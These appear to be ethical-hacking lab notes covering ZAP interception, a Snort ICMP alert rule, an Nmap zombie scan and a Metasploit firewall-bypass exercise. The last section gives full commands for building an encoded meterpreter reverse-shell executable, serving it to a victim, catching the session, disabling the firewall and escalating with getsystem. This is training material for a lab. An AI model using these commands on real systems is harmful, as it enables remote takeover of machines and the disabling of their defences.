# 10 - Session Hijacking

## Module 10 - Session Hijacking





### OWASP Zed Attack Proxy (ZAP)

* First set Victim’s Proxy settings to attacker’s IP and port 8080.
* Open ZAP and enable Break Point and click green + to view break points
* Go to settings -> local Proxies -> Change IP from localhost to network IP (in this case 10.10.10.16).
* Browse from victim and view the request and responses on the attacker machine.

{% embed url="https://app.gitbook.com/o/s2H3MdEB0Qp2IbE58Gxw/s/iS3hadq7jVFgSa8k5wRA/~/changes/38/practical-ethical-hacker-notes/zap" %}
ZAP
{% endembed %}

## Evading IDS Firewalls and Honeypots

### Snort - Intrusion Detection

#### ICMP Detection Rule

* Open C:\Snort\rules\icmp-info.rules.
* Type alert icmp $EXTERNAL\_NET any -> $HOME\_NET 10.10.10.12 (msg:"ICMP-INFO PING"; icode:0; itype:8; reference:arachnids,135; reference:cve,1999-0265; classtype:bad-unknown; sid:472; rev:7;) in Line 21.
* Save the file.

#### Start Snort in IDS mode

* Open cmd in C:Snort and Type snort -iX -A console -c C:\Snort\etc\snort.conf -l C:\Snort\log -K ascii | here X=1 , l is small L

#### Detection

Ping the snort machine and rules will be displayed in cmd

{% embed url="https://www.snort.org/" %}

### Nmap Evasion Techniques – Firewall Rule Bypass

* Enable victim firewall. Create inbound rule and block connection from attacker IP.
* Run different scans from attacker machine. Use Zombie scan to bypass firewall rule. `nmap -sI <Zombie IP><Target IP>`

### Metasploit – Firewall Bypass

#### Payload Setup&#x20;

```bash
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e
x86/shikata_ga_nai -b "\x00" LHOST=10.10.10.11 -f exe > Desktop/Exploit.exe #-e encoder, -b list of bad characters to avoid

mkdir /var/www/html/share #make directory
chmod -R 755 /var/www/html/share #change rights recursively to all files and folders inside
chown -R www-data:www-data /var/www/html/share #change owner recursively owner:group
mv /root/Desktop/Test.exe /var/www/html/share #move to exploit
service apache2 start
```

#### Listener Setup

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.10.11
#Start listener
exploit -j -z #exploit -j -z exploit tells Metasploit to start the exploit.
#The -j flag tells it to run in the context of a job and -z simply means to not interact with the session once it becomes active.
```

#### Execute Exploit

```bash
#Open http://10.10.10.11/share on victim machine. Download Payload and run.
sessions -i #to view sessions
sessions -i 1 #to interact with the session created
execute -f cmd.exe -c -H #creates a channel to execute the victim command shell
shell #opens an interactive shell (cmd)
netsh firewall show opmode #to shown firewall stats
netsh advfirewall set allprofiles state off #to turn off firewall
getsystem
Type ps #show active processes
```
